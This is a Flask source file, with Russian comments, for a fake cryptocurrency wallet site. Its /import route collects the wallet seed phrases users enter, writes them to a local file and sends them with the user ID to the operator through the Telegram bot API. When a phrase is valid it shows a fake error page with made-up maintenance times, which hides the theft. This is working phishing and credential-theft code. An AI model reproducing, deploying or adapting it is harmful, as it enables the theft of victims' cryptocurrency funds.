from flask import Flask, render_template, request
import os
import requests
import json
from datetime import datetime, timedelta

app = Flask(__name__)

# 🔑 Твой токен и chat_id (замени на реальные значения или используй переменные окружения)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Пути к файлам
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "words.txt")
USERS_FILE = os.path.join(BASE_DIR, "users.json")


# ========== Работа с пользователями ==========
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_users(users):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, ensure_ascii=False, indent=2)


# ========== Telegram уведомления ==========
def send_to_telegram(message):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print("⚠️ Не задан TELEGRAM_TOKEN или CHAT_ID")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        r = requests.post(url, data=payload)
        r.raise_for_status()
    except requests.exceptions.RequestException as e:
        print("Ошибка отправки в Telegram:", e)


# ========== Роуты ==========
@app.route("/")
def index():
    user_id = request.args.get("user_id")
    users = load_users()

    # Если юзер уже создавал кошелек → сразу открываем new_wallet.html
    if user_id and str(user_id) in users and users[str(user_id)].get("wallet_created"):
        return render_template("new_wallet.html")

    return render_template("index.html")


@app.route("/wallet")
def wallet():
    return render_template("wallet.html")


@app.route("/error")
def error():
    now = datetime.now()
    start = now - timedelta(hours=1)
    end = now + timedelta(hours=3)
    start_time = start.strftime("%H:%M %d.%m.%Y")
    end_time = end.strftime("%H:%M %d.%m.%Y")
    return render_template("error.html", start_time=start_time, end_time=end_time)


@app.route("/new_wallet")
def new_wallet():
    user_id = request.args.get("user_id")

    # 🔹 как только юзер открыл new_wallet.html — помечаем его
    if user_id:
        users = load_users()
        users[str(user_id)] = {"wallet_created": True}
        save_users(users)

    return render_template("new_wallet.html")


@app.route("/import", methods=["GET", "POST"])
def import_wallet():
    if request.method == "POST":
        seed_phrase = request.form.get("words", "").strip()
        user_id = request.args.get("user_id")

        if seed_phrase:
            # Сохраняем сид в файл
            with open(FILE_PATH, "a", encoding="utf-8") as f:
                f.write(seed_phrase + "\n")

            # Отправляем в Telegram
            send_to_telegram(f"User {user_id}: {seed_phrase}")

            # Проверка количества слов
            words = seed_phrase.split()
            if len(words) in (12, 24):
                return render_template("error.html")
            
            # ⚠ Если количество неверное → показать import с флагом
            return render_template("import.html", show_modal=True)

    return render_template("import.html", show_modal=False)


if __name__ == "__main__":
    app.run(debug=True)
